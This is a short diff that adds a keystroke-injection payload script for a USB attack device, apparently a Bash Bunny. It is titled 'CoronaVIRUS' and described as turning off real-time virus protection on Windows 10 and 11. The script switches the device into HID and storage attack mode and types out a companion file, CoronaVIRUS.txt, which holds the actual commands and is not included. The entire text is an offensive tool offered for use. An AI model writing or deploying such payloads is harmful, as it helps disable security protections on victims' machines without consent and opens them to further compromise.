@@ -1,0 +1,21 @@
+# Title: CoronaVIRUS 
+# Author: White_Wid0w
+# Version: 1.0
+# Category: Executable
+# Target: Windows 10, 11
+# Description: turns off real time virus protection for windows devices. 
+
+
+LED SETUP 
+
+GET SWITCH_POSITION   
+
+ATTACKMODE HID STORAGE
+
+LED STAGE2 
+
+QUACK DELAY 3000
+LED STAGE2
+QUACK ${SWITCH_POSITION}/CoronaVIRUS.txt 
+
+LED FINISH
